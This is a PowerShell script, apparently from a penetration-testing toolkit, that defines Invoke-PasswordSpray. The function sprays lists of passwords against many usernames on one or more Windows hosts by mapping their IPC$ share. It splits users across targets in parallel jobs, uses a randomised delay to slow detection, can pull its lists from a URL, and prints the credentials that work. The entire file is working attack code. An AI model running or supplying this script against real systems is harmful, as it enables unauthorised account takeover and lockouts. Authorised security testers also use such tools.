<#
  .SYNOPSIS
    Execute a password spraying attack.
  .PARAMETER Targets
    Target(s) to try and log in to. If more than one target is specified, the users will be split among the targets for a performance increase.
  .PARAMETER Users
    Username(s) to attempt to log in as.
  .PARAMETER Passwords
    Password(s) to spray with. To be prompted for a password, provide "*" as the password.
  .PARAMETER Delay
    A delay between each authentication attempt, in seconds.
  .PARAMETER Jitter
    Increase the range of randomness in the delay.
  .NOTES
    Author: Luke Baggett
    Date: August 6, 2014
#>
function Invoke-PasswordSpray
{
  param(
    [Parameter(Mandatory=$True)][string]$Targets,
    [Parameter(Mandatory=$True)][string]$Users,
    [Parameter(Mandatory=$True)][string]$Passwords,
    [double]$Jitter = 0.20,
    [double]$Delay = 0.00
  )

  Write-Host ((Get-Date -Format [hh:mm:ss]) + " Parsing inputs... ")
  [System.Collections.ArrayList]$UsersValue = @()
  [System.Collections.ArrayList]$TargetsValue = @()
  [System.Collections.ArrayList]$PasswordsValue = @()
  [System.Collections.ArrayList]$Parameters = @("Targets","Users","Passwords")
  if($Passwords -eq "*")
  {
    $Passwords = @((Get-Credential -Message "Provide a password to spray with.  The username doesn't matter.").GetNetworkCredential().Password)
    $Parameters.Remove("Passwords")
  }
  foreach($Parameter in $Parameters)
  {
    if((Test-Path (Get-Variable -Name $Parameter -ValueOnly)) -eq $True)
    {
      (Get-Content (Get-Variable -Name $Parameter -ValueOnly)) | % { (Get-Variable -Name ($Parameter + "Value") -ValueOnly).Add($_) | Out-Null}
    }
    elseif((Get-Variable -Name ($Parameter) -ValueOnly).Contains("http://") -or (Get-Variable -Name $Parameter -ValueOnly).Contains("https://"))
    {
      ((New-Object System.Net.WebClient).DownloadString((Get-Variable -Name $Parameter -ValueOnly)).Split(",")) | % { (Get-Variable -Name ($Parameter + "Value") -ValueOnly).Add($_) | Out-Null}
    }
    elseif((Get-Variable -Name ($Parameter) -ValueOnly).Contains(","))
    {
      (Get-Variable -Name $Parameter -ValueOnly).Split(",")  | % { (Get-Variable -Name ($Parameter + "Value") -ValueOnly).Add($_) | Out-Null}
    }
    else
    {
      (Get-Variable -Name ($Parameter + "Value") -ValueOnly).Add((Get-Variable -Name $Parameter -ValueOnly)) | Out-Null
    }
  }

  $Jobs = @()
  $ScriptBlock = {
    param(
      $Target,
      $Users,
      $Passwords,
      $Jitter,
      $Delay
    )
    $Result=@()
    $Random = New-Object System.Random
    $Network = New-Object -ComObject WScript.Network
    $ErrorActionPreference = "SilentlyContinue"
    foreach($User in $Users)
    {
      foreach($Password in $Passwords)
      {
        Start-Sleep $Random.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
        if(($Network.MapNetworkDrive("",("\\" + $Target + "\IPC$"), $False, $User, $Password)) -eq $Null)
        {
          $Result += ((Get-Date -Format [hh:mm:ss]) + " " + $Target + ":" + $User + ":" + $Password)
          $Network.RemoveNetworkDrive("\\" + $Target + "\IPC$") 2>&1
          break
        }
      }
    }
    return $Result
  }

  if($TargetsValue.Count -gt 1)
  {
    $SplitUsers = @{}
    foreach($TargetCounter in (1..$TargetsValue.Count))
    {
      if($TargetCounter -ne $TargetsValue.Count)
      {
        $SplitUsers[$TargetCounter] = $UsersValue[(([int]($UsersValue.Count/$TargetsValue.Count))*($TargetCounter - 1))..((([int]($UsersValue.Count/$TargetsValue.Count))*($TargetCounter - 1)) + ([int]($UsersValue.Count/$TargetsValue.Count)) - 1)]
      }
      else
      {
        $SplitUsers[$TargetCounter] = $UsersValue[(([int]($UsersValue.Count/$TargetsValue.Count))*($TargetCounter - 1))..$UsersValue.Count]
        break
      }
    }
  }

  Write-Host ((Get-Date -Format [hh:mm:ss]) + " Starting Attack... ")
  foreach($Target in $TargetsValue)
  {
    if($TargetsValue.Count -gt 1){$Arguments = @($Target,$SplitUsers[($TargetsValue.IndexOf($Target)+1)],$PasswordsValue,$Jitter,$Delay)}
    else{$Arguments = @($Target,$UsersValue,$PasswordsValue,$Jitter,$Delay)}
    $Jobs += (Start-Job $ScriptBlock -ArgumentList $Arguments).Name
  }

  foreach($JobName in $Jobs)
  {
    foreach($Result in (Wait-Job -Name $JobName | Receive-Job)){$Result}
    Remove-Job -Name $JobName -Force
  }
  Write-Host ((Get-Date -Format [hh:mm:ss]) + " All Jobs Complete. ")
}